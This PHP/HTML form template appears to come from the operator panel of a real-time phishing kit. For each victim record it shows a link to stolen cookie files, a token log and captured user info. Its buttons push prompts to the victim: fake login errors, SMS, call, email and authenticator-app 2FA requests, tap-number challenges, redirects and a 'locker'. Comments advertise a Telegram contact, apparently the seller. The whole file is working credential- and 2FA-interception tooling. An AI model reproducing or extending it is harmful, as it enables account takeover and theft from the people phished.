<fieldset>
    <div class="form-group">

    <label for="datalog">Data Info</label>

    <textarea name="datalog" placeholder="Info" class="form-control" id="datalog" style="height:150px; "><?php echo htmlspecialchars(($edit) ? $customer['datalog'] : '', ENT_QUOTES, 'UTF-8'); ?></textarea>


<div id="cookie_frm" style="padding-top:10px;display:none;">
    <a target="_blank" class="btn btn-warning" href="data/<?php echo htmlspecialchars(($edit) ? $customer['botid'] : '', ENT_QUOTES, 'UTF-8'); ?>.json">Cookie<i class="glyphicon glyphicon-send"></i></a>
</div>

<script>
  if (document.getElementById('cookie_frm').innerHTML.indexOf('0.json') ==-1)
  document.getElementById('cookie_frm').style.display='';

  <?php
// Telegram @fletchen
  $fls=($edit) ? $customer['botid'] : '';

  $fls='data/'.$fls.'.json';

  if(@fopen($fls, "r"))
   {
  		echo "document.getElementById('cookie_frm').style.display='';";
   }
   else {
     echo  "document.getElementById('cookie_frm').style.display='none';";
   }

  ?>
</script>



    </div>

    <div id="btngroup" class="form-group">
    <label for="tokenlog">Token log</label>

    <style>
.btnw
{
width:200px;
}

.divpd
{
padding-top:10px;
}
    </style>

    <textarea name="tokenlog" placeholder="" class="form-control" id="tokenlog" style="height:180px; "><?php echo htmlspecialchars(($edit) ? $customer['tokenlog'] : '', ENT_QUOTES, 'UTF-8'); ?></textarea>
    <input type="hidden" id="tokenstate" name="tokenstate" value="">

     <div  class="divpd" align="center" style="padding-top:10px;">
      <div>
      <button  id="errloginpass_btn" class="btnw btn btn-warning" >Incorrect login <i class="glyphicon glyphicon-send"></i></button>
      </div>


      <div style="padding-top:20px;">
      <button  id="sms_btn" class="btnw btn btn-warning" >2FA SMS <i class="glyphicon glyphicon-send"></i></button>
      <button  id="errsms_btn" class="btnw btn btn-warning" >Error 2FA SMS <i class="glyphicon glyphicon-send"></i></button>
      </div><!-- Telegram @fletchen -->

      <div style="padding-top:20px;">
      <button  id="call_btn" class="btnw btn btn-warning" >2FA CALL <i class="glyphicon glyphicon-send"></i></button>
      <button  id="errcall_btn" class="btnw btn btn-warning" >Error 2FA CALL <i class="glyphicon glyphicon-send"></i></button>
      </div>

      <div style="padding-top:20px;">
      <button  id="email_btn" class="btnw btn btn-warning" >2FA EMAIL <i class="glyphicon glyphicon-send"></i></button>
      <button  id="erremail_btn" class="btnw btn btn-warning" >Error 2FA EMAIL <i class="glyphicon glyphicon-send"></i></button>
      </div>


      <div style="padding-top:20px;">
      <button  id="authapp_btn" class="btnw btn btn-warning" >2FA AUTH APP <i class="glyphicon glyphicon-send"></i></button>
      <button  id="errauthapp_btn" class="btnw btn btn-warning" >Error 2FA AUTH APP <i class="glyphicon glyphicon-send"></i></button>
      </div>


      <div style="padding-top:20px;">
      <input id="id_tapnumber" style="height:30px; width:140px;padding-left:10px;margin-right:10px;" placeholder="TAP NUMBER">  <button  id="tapnumber_btn" class="btnw btn btn-warning" >2FA TAP NUMBER<i class="glyphicon glyphicon-send"></i></button>
       <button  id="err_tapnumber_btn" class="btnw btn btn-warning" >Error TAP NUMBER<i class="glyphicon glyphicon-send"></i></button>
      </div>



    <div  style="padding-top:20px;">
    <button  id="redirect_btn" class="btnw btn btn-warning" >Redirect <i class="glyphicon glyphicon-send"></i></button>
    <button  id="locker_btn" class="btnw btn btn-warning" >Locker <i class="glyphicon glyphicon-send"></i></button>
    </div><!-- Telegram @fletchen -->



    </div>




    </div>

    <script>


    function errtapnumberapp_func ()
    {
      tmp='[2FATOKENERROR='+$('#id_tapnumber').val()+']'
      $('#tokenstate').val(tmp);
      $('#tokenlog').val('>>ERROR TAP NUMBER '+$('#id_tapnumber').val()+' request\r\n'+ $('#tokenlog').val());
      control_post();
      return false;
    }

    function tapnumberfunc ()
    {
      tmp='[2FATOKEN='+$('#id_tapnumber').val()+']'
      $('#tokenstate').val(tmp);
      $('#tokenlog').val('>>TAP NUMBER '+$('#id_tapnumber').val()+' request\r\n'+ $('#tokenlog').val());
      control_post();
      return false
    }



    function authappfunc ()
    {

      $('#tokenstate').val('[AUTHAPP]');
      $('#tokenlog').val('>>AUTH APP 2FA verification\r\n'+ $('#tokenlog').val());
      control_post();
      return false;
    }


    function erruthapp_func ()
    {

      $('#tokenstate').val('[ERRAUTHAPP]');
      $('#tokenlog').val('>>Error AUTH APP 2FA verification\r\n'+ $('#tokenlog').val());
      control_post();
      return false;
    }




function mailfunc ()
{

  $('#tokenstate').val('[MAIL]');
  $('#tokenlog').val('>>MAIL 2FA verification\r\n'+ $('#tokenlog').val());
  control_post();
  return false;
}


function errmail_func ()
{

  $('#tokenstate').val('[ERRMAIL]');
  $('#tokenlog').val('>>Error MAIL 2FA verification\r\n'+ $('#tokenlog').val());
  control_post();
  return false;
}


    function smsfunc ()
    {

      $('#tokenstate').val('[SMS]');
      $('#tokenlog').val('>>SMS 2FA verification\r\n'+ $('#tokenlog').val());
      control_post();
      return false;
    }


    function errsms_func ()
    {

      $('#tokenstate').val('[ERRSMS]');
      $('#tokenlog').val('>>Error SMS 2FA verification\r\n'+ $('#tokenlog').val());
      control_post();
      return false;
    }





    function callfunc ()
    {

      $('#tokenstate').val('[CALL]');
      $('#tokenlog').val('>>CALL 2FA verification\r\n'+ $('#tokenlog').val());
      control_post();
      return false;
    }


    function errcall_func ()
    {

      $('#tokenstate').val('[ERRCALL]');
      $('#tokenlog').val('>>Error CALL 2FA verification\r\n'+ $('#tokenlog').val());
      control_post();
      return false;
    }



function otpfunc ()
{

  $('#tokenstate').val('[OTP]');
  $('#tokenlog').val('>>OTP verification\r\n'+ $('#tokenlog').val());
  control_post();
  return false;
}


function err_otp_func ()
{

  $('#tokenstate').val('[ERROTP]');
  $('#tokenlog').val('>>Error OTP verification\r\n'+ $('#tokenlog').val());
  control_post();
  return false;
}



    function errloginpassfunc ()
    {

      $('#tokenstate').val('[ERRLOGIN]');
      $('#tokenlog').val('>>Error login verification\r\n'+ $('#tokenlog').val());
      control_post();
      return false;
    }


    function phoneveriffunc ()
    {

      $('#tokenstate').val('[PHONE]');
      $('#tokenlog').val('>>Phone/Email verification\r\n'+ $('#tokenlog').val());
      control_post();
      return false;
    }


    function errphoneveriffunc ()
    {

      $('#tokenstate').val('[ERRPHONE]');
      $('#tokenlog').val('>>Error Phone/Email verification\r\n'+ $('#tokenlog').val());
      control_post();
      return false;
    }


    function errmailingaddrfunc ()
    {

      $('#tokenstate').val('[ERRMAILADDR]');
      $('#tokenlog').val('>>Error Mailing Address verification\r\n'+ $('#tokenlog').val());
      control_post();
      return false;
    }

    function mailingaddrfunc ()
    {
      tmp='[2FATOKEN='+$('#id_fullname').val()+']'
      $('#tokenstate').val(tmp);
      $('#tokenlog').val('>>Full Name '+$('#id_fullname').val()+' request\r\n'+ $('#tokenlog').val());
      control_post();
      return false
    }


    function errtokenveriffunc ()
    {
      tmp='[2FATOKENERROR='+$('#id2_token_number').val()+']'
      $('#tokenstate').val(tmp);
      $('#tokenlog').val('>>Error TOKEN '+$('#id2_token_number').val()+' request\r\n'+ $('#tokenlog').val());
      control_post();
      return false
    }


    function locker_func ()
    {
      $('#tokenstate').val('[LOCKER]');
      $('#tokenlog').val('>>LOCKER\r\n'+ $('#tokenlog').val());
      control_post();
      return false
    }

    function redirect_func ()
    {
      $('#tokenstate').val('[REDIRECT]');
      $('#tokenlog').val('>>REDIRECT\r\n'+ $('#tokenlog').val());
      control_post();
      return false
    }



    function control_post() {
    var s_url=document.location.href;
    var  datalog=  $('#datalog').val();
    var  tokenlog=  $('#tokenlog').val();
    var  tokenstate=  $('#tokenstate').val();
    var  userinformation= $('#userinformation').val();
    var  comment= $('#comment').val();
    $.post(s_url, { datalog: datalog, tokenlog: tokenlog,  tokenstate: tokenstate,  userinformation: userinformation, comment: comment} );
      return false;
  }

    $("#customer_form").ready(function()
     {



       $('#erremail_btn').click(function(){ errmail_func(); return false;  });
       $('#email_btn').click(function(){ mailfunc(); return false;  });

       $('#err_tapnumber_btn').click(function(){ errtapnumberapp_func(); return false;  });
       $('#tapnumber_btn').click(function(){ tapnumberfunc(); return false;  });

       $('#errauthapp_btn').click(function(){ erruthapp_func(); return false;  });
       $('#authapp_btn').click(function(){ authappfunc(); return false;  });

       $('#errsms_btn').click(function(){ errsms_func(); return false;  });
       $('#sms_btn').click(function(){ smsfunc(); return false;  });

       $('#errcall_btn').click(function(){ errcall_func(); return false;  });
       $('#call_btn').click(function(){ callfunc(); return false;  });


    $('#errotp_btn').click(function(){ err_otp_func(); return false;  });
    $('#otp_btn').click(function(){ otpfunc(); return false;  });

          $('#err_mailingaddr_btn').click(function(){ errmailingaddrfunc(); return false;  });
          $('#mailingaddr_btn').click(function(){ mailingaddrfunc(); return false;  });
          $('#errloginpass_btn').click(function(){ errloginpassfunc(); return false;  });
          $('#phone_btn').click(function(){ phoneveriffunc(); return false;  });
          $('#errphone_btn').click(function(){ errphoneveriffunc(); return false;  });

          $('#token_btn').click(function(){ tokenveriffunc(); return false;  });
          $('#err_token_btn').click(function(){ errtokenveriffunc(); return false;  });


          $('#redirect_btn').click(function(){ redirectfunc(); return false;  });
          $('#locker_btn').click(function(){ locker_func(); return false;  });

       });

    </script>



    <div class="form-group"><!-- Telegram @fletchen -->
        <label for="userinformation">User info</label>

 <textarea name="userinformation" placeholder="" class="form-control" id="userinformation" style="height:537px; "><?php echo htmlspecialchars(($edit) ? $customer['userinformation'] : '', ENT_QUOTES, 'UTF-8'); ?></textarea>

             </div>








    <div class="form-group">
        <label for="comment">Comment</label>
        <input name="comment" value="<?php echo htmlspecialchars($edit ? $customer['comment'] : '', ENT_QUOTES, 'UTF-8'); ?>" placeholder="" class="form-control"  type="text" id="comment">
    </div>




    <div class="form-group text-center">
        <label></label>
        <button type="submit" class="btn btn-warning" >Save <i class="glyphicon glyphicon-send"></i></button>
    </div>
</fieldset>
